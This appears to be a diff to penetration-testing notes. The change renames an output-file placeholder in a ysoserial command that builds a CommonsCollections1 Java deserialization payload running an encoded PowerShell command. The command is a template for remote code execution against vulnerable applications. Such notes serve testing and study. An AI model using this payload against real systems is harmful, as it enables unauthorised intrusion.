@@ -8,7 +8,7 @@
 https://github.com/frohoff/ysoserial
 
 ```bash
-java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>
+java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <OUTFILE>
 ```
 
 = lib_payload : CommonsCollections1
